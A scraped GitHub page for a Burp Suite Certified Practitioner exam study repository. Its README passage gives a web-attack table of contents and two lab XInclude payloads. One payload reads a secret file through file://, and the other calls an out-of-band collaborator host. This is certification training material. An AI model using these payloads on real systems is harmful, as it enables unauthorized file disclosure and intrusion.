</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Issues
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i2pull-requests-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-e1dec533-3c4a-4052-9908-fc09e4dc8375" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/pulls" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request">
    <path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354ZM3.75 2.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm0 9.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm8.25.75a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Pull requests
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i3actions-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-e7e90fdf-a28f-47d8-9c1c-4375b6dc31df" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/actions" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Actions
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i4projects-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-80fbb730-b085-463d-9fc8-68c6f3101860" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/projects" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25ZM6.5 6.5v8h7.75a.25.25 0 0 0 .25-.25V6.5Zm8-1.5V1.75a.25.25 0 0 0-.25-.25H6.5V5Zm-13 1.5v7.75c0 .138.112.25.25.25H5v-8ZM5 5V1.5H1.75a.25.25 0 0 0-.25.25V5Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Projects
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i5security-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-a24e899d-ebd2-4d26-a656-38b79e36edb1" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/security" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield">
    <path d="M7.467.133a1.748 1.748 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM8.75 4.75v3a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0ZM9 10.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Security
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i6insights-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-abc04085-803a-4aae-8000-5ffdf557f12c" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/pulse" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph">
    <path d="M1.5 1.75V13.5h13.75a.75.75 0 0 1 0 1.5H.75a.75.75 0 0 1-.75-.75V1.75a.75.75 0 0 1 1.5 0Zm14.28 2.53-5.25 5.25a.75.75 0 0 1-1.06 0L7 7.06 4.28 9.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.25-3.25a.75.75 0 0 1 1.06 0L10 7.94l4.72-4.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Insights
</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu></div>
</nav>

  </div>
  



<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
    <div id="repo-content-pjax-container" class="repository-content " >
    



    
      
  <h1 class='sr-only'>botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study</h1>
  <div class="clearfix container-xl px-md-4 px-lg-5 px-3">
    <div>

  <div style="max-width: 100%" data-view-component="true" class="Layout Layout--flowRow-until-md react-repos-overview-margin Layout--sidebarPosition-end Layout--sidebarPosition-flowRow-end">
  <div data-view-component="true" class="Layout-main">      <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.fbf61c683a537e8f92d5.module.css" />
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/67240.8050999de9202f04fc44.module.css" />

<react-partial
  partial-name="repos-overview"
  data-ssr="true"
  data-attempted-ssr="true"
  data-react-profiling="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"initialPayload":{"allShortcutsEnabled":false,"path":"/","repo":{"id":586233738,"defaultBranch":"main","name":"Burp-Suite-Certified-Practitioner-Exam-Study","ownerLogin":"botesjuan","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2023-01-07T12:20:51.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/52822072?v=4","public":true,"private":false,"isOrgOwned":false},"currentUser":null,"refInfo":{"name":"main","listCacheKey":"v0:1712998699.0","canEdit":false,"refType":"branch","currentOid":"300aea41497653e45f45ba90d3a69b40863c9fef"},"tree":{"items":[{"name":"code","path":"code","contentType":"directory"},{"name":"extras","path":"extras","contentType":"directory"},{"name":"images","path":"images","contentType":"directory"},{"name":"payloads","path":"payloads","contentType":"directory"},{"name":"python","path":"python","contentType":"directory"},{"name":"wordlists","path":"wordlists","contentType":"directory"},{"name":"README.md","path":"README.md","contentType":"file"}],"templateDirectorySuggestionUrl":null,"readme":null,"totalCount":7,"showBranchInfobar":false},"fileTree":null,"fileTreeProcessingTime":null,"foldersToFetch":[],"treeExpanded":false,"symbolsExpanded":false,"copilotSWEAgentEnabled":false,"isOverview":true,"overview":{"banners":{"shouldRecommendReadme":false,"isPersonalRepo":false,"showUseActionBanner":false,"actionSlug":null,"actionId":null,"showProtectBranchBanner":false,"publishBannersInfo":{"dismissActionNoticePath":"/settings/dismiss-notice/publish_action_from_repo","releasePath":"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/releases/new?marketplace=true","showPublishActionBanner":false},"interactionLimitBanner":null,"showInvitationBanner":false,"inviterName":null,"actionsMigrationBannerInfo":{"releaseTags":[],"showImmutableActionsMigrationBanner":false,"initialMigrationStatus":null},"showDeployBanner":false,"detectedStack":{"framework":null,"packageManager":null}},"codeButton":{"contactPath":"/contact","isEnterprise":false,"local":{"protocolInfo":{"httpAvailable":true,"sshAvailable":null,"httpUrl":"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git","showCloneWarning":null,"sshUrl":null,"sshCertificatesRequired":null,"sshCertificatesAvailable":null,"ghCliUrl":"gh repo clone botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study","defaultProtocol":"http","newSshKeyUrl":"/settings/ssh/new","setProtocolPath":"/users/set_protocol"},"platformInfo":{"cloneUrl":"https://desktop.github.com","showVisualStudioCloneButton":false,"visualStudioCloneUrl":"https://windows.github.com","showXcodeCloneButton":false,"xcodeCloneUrl":"xcode://clone?repo=https%3A%2F%2Fgithub.com%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study","zipballUrl":"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/archive/refs/heads/main.zip"}},"newCodespacePath":"/codespaces/new?hide_repo_select=true\u0026repo=586233738"},"popovers":{"rename":null,"renamedParentRepo":null},"commitCount":"782","overviewFiles":[{"displayName":"README.md","repoName":"Burp-Suite-Certified-Practitioner-Exam-Study","refName":"main","path":"README.md","preferredFileType":"readme","tabName":"README","richText":"\u003carticle class=\"markdown-body entry-content container-lg\" itemprop=\"text\"\u003e\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBurp Suite Certified Practitioner Exam Study\u003c/h1\u003e\u003ca id=\"user-content-burp-suite-certified-practitioner-exam-study\" class=\"anchor\" aria-label=\"Permalink: Burp Suite Certified Practitioner Exam Study\" href=\"#burp-suite-certified-practitioner-exam-study\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis is my study notes with over a 110 PortSwigger Academy Labs.\nI used these labs to pass the \u003ca href=\"https://portswigger.net/web-security/certification\" rel=\"nofollow\"\u003eBurp Suite Certified Practitioner\u003c/a\u003e Exam 2023.\nMy \u003ca href=\"https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8\" rel=\"nofollow\"\u003eBSCP qualification\u003c/a\u003e.\u003cbr\u003e\nFor more informaion go to \u003ca href=\"https://portswigger.net/web-security/all-materials\" rel=\"nofollow\"\u003ePortSwigger Academy\u003c/a\u003e to get latest learning materials.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ca href=\"#scanning\"\u003eSCANNING\u003c/a\u003e - Enumeration\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"#focus-scanning\"\u003eFocus Scanning\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#scanning-non-standard-data-structures\"\u003eScan non-standard entities\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ca href=\"#foothold\"\u003eFOOTHOLD\u003c/a\u003e - Stage 1\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"#content-discovery\"\u003eContent Discovery\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dom-based-xss\"\u003eDOM-XSS\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#cross-site-scripting\"\u003eXSS Cross Site Scripting\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#web-cache-poison\"\u003eWeb Cache Poison\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#host-headers\"\u003eHost Headers\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#http-request-smuggling\"\u003eHTTP Request Smuggling\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#brute-force\"\u003eBrute force\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#authentication\"\u003eAuthentication\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ca href=\"#privilege-escalation\"\u003ePRIVILEGE ESCALATION\u003c/a\u003e - Stage 2\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"#csrf-account-takeover\"\u003eCSRF - Account Takeover\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#password-reset\"\u003ePassword Reset\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#sql-injection\"\u003eSQLi - SQL Injection\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#jwt\"\u003eJWT - JSON Web Tokens\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#prototype-pollution\"\u003ePrototype pollution\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#api-testing\"\u003eAPI Testing\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#access-control\"\u003eAccess Control\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#graphql-api\"\u003eGraphQL API Endpoints\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#cors\"\u003eCORS - Cross-origin resource sharing\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ca href=\"#data-exfiltration\"\u003eDATA EXFILTRATION\u003c/a\u003e - Stage 3\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"#xxe-injections\"\u003eXXE - XML entities \u0026amp; Injections\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#ssrf---server-side-request-forgery\"\u003eSSRF - Server side request forgery\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#ssti---server-side-template-injection\"\u003eSSTI - Server side template injection\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#sspp---server-side-prototype-pollution\"\u003eSSPP - Server Side Prototype Pollution\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#file-path-traversal\"\u003eLFI - File path traversal\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#file-uploads\"\u003eFile Uploads\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#deserialization\"\u003eDeserialization\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#os-command-injection\"\u003eOS Command Injection\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ca href=\"#appendix\"\u003eAPPENDIX\u003c/a\u003e\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"#python-scripts\"\u003ePython Scripts\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/README.md\"\u003ePayloads\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists\"\u003eWord lists\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#focus-scanning\"\u003eFocus target scanning\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#approach\"\u003eApproach\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#extra-training-content\"\u003eExtra Training Content\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#burp-exam-results\"\u003eMy Burp Tips\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eI can recommend doing as many as possible \u003ca href=\"https://portswigger.net/web-security/mystery-lab-challenge\" rel=\"nofollow\"\u003eMystery lab challenge\u003c/a\u003e to test your skills and decrease the time it takes you to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the vulnerabilities, before taking the exam.\u003cbr\u003e\nI also found this PortSwigger advice on \u003ca href=\"https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam?tid=SNL7Q8oXE1mjUW1rSgswXSPIjhdLL5210Y-ogEuD1GZVp1w5spKfl5OJjAtj8AAC\" rel=\"nofollow\"\u003eRetaking your exam\u003c/a\u003e very informative.\u003cbr\u003e\nWatch \u003ca href=\"https://youtu.be/L-3jJTGLAhc?si=Mze8eY9mjaJl1PWR\" rel=\"nofollow\"\u003eCryptoCat - Burp Suite Certified Professional (BSCP) Review + Tips/Tricks\u003c/a\u003e for fresh view of the BSCP exam in 2024.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp dir=\"auto\"\u003e\u003cbr\u003e\u003cbr\u003e\u003ca href=\"https://www.buymeacoffee.com/botesjuan\" rel=\"nofollow\"\u003e\u003cimg src=\"https://camo.githubusercontent.com/0cf29a542375e1a46e84d8bf5805a4e5c0a6ee98b6547ccdc0c55eed49d99c69/68747470733a2f2f63646e2e6275796d6561636f666665652e636f6d2f627574746f6e732f76322f64656661756c742d79656c6c6f772e706e67\" alt=\"Buy Me A Coffee\" style=\"height: 60px !important; width: 217px !important; max-width: 100%;\" data-canonical-src=\"https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThanks too all for your support by buying me \u003cem\u003e\u003cstrong\u003ecoffee\u003c/strong\u003e\u003c/em\u003e, thanks you so much \u003ccode\u003e\\o/\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/e/c/6e42f5738e5b9bf8?utm_source=office\u0026amp;utm_medium=email\u0026amp;utm_campaign=burp-prac-cert-pass-success\" rel=\"nofollow\"\u003eMy Burp Suite Certified Practitioner certificate.\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eScanning\u003c/h1\u003e\u003ca id=\"user-content-scanning\" class=\"anchor\" aria-label=\"Permalink: Scanning\" href=\"#scanning\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eEnumeration of the Web Applications start with initial and directed scanning in time limited engagement.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#focus-scanning\"\u003eFocus Scanning\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#scanning-non-standard-data-structures\"\u003eScan non-standard entities\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFocus Scanning\u003c/h2\u003e\u003ca id=\"user-content-focus-scanning\" class=\"anchor\" aria-label=\"Permalink: Focus Scanning\" href=\"#focus-scanning\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDue to the tight time limit during engagements or exam, \u003ca href=\"https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing\" rel=\"nofollow\"\u003escan defined insertion points\u003c/a\u003e for specific requests.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/scan-defined-insertion-points.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/scan-defined-insertion-points.png\" alt=\"scan-defined-insertion-points\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eScanner detected \u003cstrong\u003eXML injection\u003c/strong\u003e vulnerability on storeId parameter and this lead to reading the secret Carlos file.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;foo xmlns:xi=\u0026quot;http://www.w3.org/2001/XInclude\u0026quot;\u0026gt;\u0026lt;xi:include parse=\u0026quot;text\u0026quot; href=\u0026quot;file:///home/carlos/secret\u0026quot;/\u0026gt;\u0026lt;/foo\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;\u003cspan class=\"pl-ent\"\u003efoo\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e:\u003c/span\u003e\u003cspan class=\"pl-e\"\u003exi\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://www.w3.org/2001/XInclude\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003exi\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003e:\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einclude\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eparse\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etext\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ehref\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efile:///home/carlos/secret\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e/\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003efoo\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOut of band XInclude request, need hosted DTD to read local file.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;hqt xmlns:xi=\u0026quot;http://www.w3.org/2001/XInclude\u0026quot;\u0026gt;\u0026lt;xi:include href=\u0026quot;http://OASTIFY.COM/foo\u0026quot;/\u0026gt;\u0026lt;/hqt\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;\u003cspan class=\"pl-ent\"\u003ehqt\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e:\u003c/span\u003e\u003cspan class=\"pl-e\"\u003exi\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://www.w3.org/2001/XInclude\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003exi\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003e:\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einclude\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ehref\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://OASTIFY.COM/foo\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e/\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003ehqt\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning\" rel=\"nofollow\"\u003ePortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eScanning non-standard data structures\u003c/h2\u003e\u003ca id=\"user-content-scanning-non-standard-data-structures\" class=\"anchor\" aria-label=\"Permalink: Scanning non-standard data structures\" href=\"#scanning-non-standard-data-structures\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eScanning non-standard data structures using Burp feature to scan selected insertion point for select text in response or requests.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/scan-selected-insertion-point.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/scan-selected-insertion-point.png\" alt=\"scan-selected-insertion-point\" style=\"max-width: 